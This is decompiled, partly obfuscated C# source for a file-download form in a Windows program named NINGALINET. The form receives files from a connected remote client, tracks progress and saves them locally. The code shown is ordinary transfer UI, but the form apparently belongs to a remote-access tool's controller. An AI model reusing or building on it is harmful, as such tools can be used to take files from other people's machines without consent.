using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x02000011 RID: 17
	[DesignerGenerated]
	public partial class FrmDwonload : Form
	{
		// Token: 0x06000389 RID: 905 RVA: 0x000033E7 File Offset: 0x000015E7
		[DebuggerNonUserCode]
		static FrmDwonload()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmDwonload.__ENCList = new List<WeakReference>();
		}

		// Token: 0x0600038A RID: 906 RVA: 0x000224E0 File Offset: 0x000206E0
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmDwonload.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmDwonload.__ENCList.Count == FrmDwonload.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmDwonload.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmDwonload.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmDwonload.__ENCList[num] = FrmDwonload.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmDwonload.__ENCList.RemoveRange(num, FrmDwonload.__ENCList.Count - num);
						FrmDwonload.__ENCList.Capacity = FrmDwonload.__ENCList.Count;
					}
					FrmDwonload.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x17000163 RID: 355
		// (get) Token: 0x0600038D RID: 909 RVA: 0x00022B34 File Offset: 0x00020D34
		// (set) Token: 0x0600038E RID: 910 RVA: 0x00022B4C File Offset: 0x00020D4C
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				if (this._Timer1 != null)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				if (this._Timer1 != null)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x17000164 RID: 356
		// (get) Token: 0x0600038F RID: 911 RVA: 0x00022BA4 File Offset: 0x00020DA4
		// (set) Token: 0x06000390 RID: 912 RVA: 0x000033F8 File Offset: 0x000015F8
		internal virtual CHProgressbar Progressbar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Progressbar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Progressbar1 = value;
			}
		}

		// Token: 0x17000165 RID: 357
		// (get) Token: 0x06000391 RID: 913 RVA: 0x00022BBC File Offset: 0x00020DBC
		// (set) Token: 0x06000392 RID: 914 RVA: 0x00003401 File Offset: 0x00001601
		internal virtual Label Lname
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lname;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lname = value;
			}
		}

		// Token: 0x17000166 RID: 358
		// (get) Token: 0x06000393 RID: 915 RVA: 0x00022BD4 File Offset: 0x00020DD4
		// (set) Token: 0x06000394 RID: 916 RVA: 0x0000340A File Offset: 0x0000160A
		internal virtual Label Lspeed
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lspeed;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lspeed = value;
			}
		}

		// Token: 0x17000167 RID: 359
		// (get) Token: 0x06000395 RID: 917 RVA: 0x00022BEC File Offset: 0x00020DEC
		// (set) Token: 0x06000396 RID: 918 RVA: 0x00003413 File Offset: 0x00001613
		internal virtual Label Ldata
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Ldata;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Ldata = value;
			}
		}

		// Token: 0x17000168 RID: 360
		// (get) Token: 0x06000397 RID: 919 RVA: 0x00022C04 File Offset: 0x00020E04
		// (set) Token: 0x06000398 RID: 920 RVA: 0x0000341C File Offset: 0x0000161C
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x17000169 RID: 361
		// (get) Token: 0x06000399 RID: 921 RVA: 0x00022C1C File Offset: 0x00020E1C
		// (set) Token: 0x0600039A RID: 922 RVA: 0x00003425 File Offset: 0x00001625
		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox1 = value;
			}
		}

		// Token: 0x0600039B RID: 923 RVA: 0x00022C34 File Offset: 0x00020E34
		public FrmDwonload()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.FormClosing += new FormClosingEventHandler(this.DW_FormClosing);
			base.Load += new EventHandler(this.DW_Load);
			FrmDwonload.__ENCAddToList(this);
			this.os = 0;
			this.SZ = 0;
			this.os = 0;
			this.InitializeComponent();
		}

		// Token: 0x0600039C RID: 924 RVA: 0x00022CA0 File Offset: 0x00020EA0
		public void savedata()
		{
			this.PictureBox1.Image = Resources.@checked;
			try
			{
				MyProject.Computer.Audio.Play(Resources.Sound, AudioPlayMode.Background);
			}
			catch (Exception expr_27)
			{
				ProjectData.SetProjectError(expr_27);
				ProjectData.ClearProjectError();
			}
			if (File.Exists(Application.StartupPath + "\\Downloads\\" + this.Lname.Text))
			{
				File.Delete(Application.StartupPath + "\\Downloads\\" + this.Lname.Text);
			}
			File.Move(Application.StartupPath + "\\" + Conversions.ToString(this.GetHashCode()), Application.StartupPath + "\\Downloads\\" + this.Lname.Text);
			this.FS.Close();
			this.FS.Dispose();
			if (this.CheckBox1.Checked)
			{
				Process.Start(Application.StartupPath + "\\Downloads\\");
			}
			ima.F.sl.Text = "Download file " + this.Lname.Text + "succeeded..";
		}

		// Token: 0x0600039D RID: 925 RVA: 0x00022DCC File Offset: 0x00020FCC
		private void DW_FormClosing(object sender, FormClosingEventArgs e)
		{
			Fungsi.STV("dlck", Conversions.ToString(this.CheckBox1.Checked));
			this.c.Send("close" + ima.Y + this.FNn);
			this.FS.Close();
			this.FS.Dispose();
			try
			{
				File.Delete(Application.StartupPath + "\\" + Conversions.ToString(this.GetHashCode()));
			}
			catch (Exception expr_72)
			{
				ProjectData.SetProjectError(expr_72);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600039E RID: 926 RVA: 0x00022E6C File Offset: 0x0002106C
		private void DW_Load(object sender, EventArgs e)
		{
			this.CheckBox1.Checked = Conversions.ToBoolean(Fungsi.GTV("dlck", Conversions.ToString(this.CheckBox1.Checked)));
			if (!Directory.Exists(Application.StartupPath + "\\Downloads\\"))
			{
				Directory.CreateDirectory(Application.StartupPath + "\\Downloads\\");
			}
			checked
			{
				this.Left = 0 - this.Width + Screen.PrimaryScreen.WorkingArea.Width;
				this.Top = 0 - this.Height + Screen.PrimaryScreen.WorkingArea.Height;
				this.Text = Fungsi.DEB(ref this.FNn);
				this.Name = this.c.ip() + this.FNn;
				this.Lname.Text = new FileInfo(Fungsi.DEB(ref this.FNn)).Name;
			}
			this.Ldata.Text = FrmDwonload.Siz((long)this.Progressbar1.Value) + "/" + FrmDwonload.Siz((long)this.SZ);
			this.Lspeed.Text = FrmDwonload.Siz((long)(checked(this.Progressbar1.Value - this.os)));
			this.FS = new FileStream(Application.StartupPath + "\\" + Conversions.ToString(this.GetHashCode()), FileMode.Append);
			this.os = this.Progressbar1.Value;
			this.Timer1.Enabled = true;
		}

		// Token: 0x0600039F RID: 927 RVA: 0x00022FF8 File Offset: 0x000211F8
		public static string Siz(long s)
		{
			string result;
			if (s.ToString().Length < 4)
			{
				result = Conversions.ToString(s) + " B";
			}
			else
			{
				double num = (double)s / 1024.0;
				string str;
				if (num < 1024.0)
				{
					str = "KB";
				}
				else
				{
					num /= 1024.0;
					if (num < 1024.0)
					{
						str = "MB";
					}
					else
					{
						num /= 1024.0;
						str = "GB";
					}
				}
				result = num.ToString(".0") + " " + str;
			}
			return result;
		}

		// Token: 0x060003A0 RID: 928 RVA: 0x000230A0 File Offset: 0x000212A0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				this.Ldata.Text = FrmDwonload.Siz((long)this.Progressbar1.Value) + "/" + FrmDwonload.Siz((long)this.SZ);
				this.Lspeed.Text = FrmDwonload.Siz((long)(checked(this.Progressbar1.Value - this.os)));
				this.os = this.Progressbar1.Value;
			}
			catch (Exception expr_69)
			{
				ProjectData.SetProjectError(expr_69);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x040001A8 RID: 424
		private static List<WeakReference> __ENCList;

		// Token: 0x040001AA RID: 426
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x040001AB RID: 427
		[AccessedThroughProperty("Progressbar1")]
		private CHProgressbar _Progressbar1;

		// Token: 0x040001AC RID: 428
		[AccessedThroughProperty("Lname")]
		private Label _Lname;

		// Token: 0x040001AD RID: 429
		[AccessedThroughProperty("Lspeed")]
		private Label _Lspeed;

		// Token: 0x040001AE RID: 430
		[AccessedThroughProperty("Ldata")]
		private Label _Ldata;

		// Token: 0x040001AF RID: 431
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x040001B0 RID: 432
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		// Token: 0x040001B1 RID: 433
		public string FNn;

		// Token: 0x040001B2 RID: 434
		public FileStream FS;

		// Token: 0x040001B3 RID: 435
		public int os;

		// Token: 0x040001B4 RID: 436
		public int SZ;

		// Token: 0x040001B5 RID: 437
		public string TMP;

		// Token: 0x040001B6 RID: 438
		public Client c;

		// Token: 0x040001B7 RID: 439
		public int Pvalue;

		// Token: 0x040001B8 RID: 440
		public object folder;

		// Token: 0x040001B9 RID: 441
		public object folder2;
	}
}
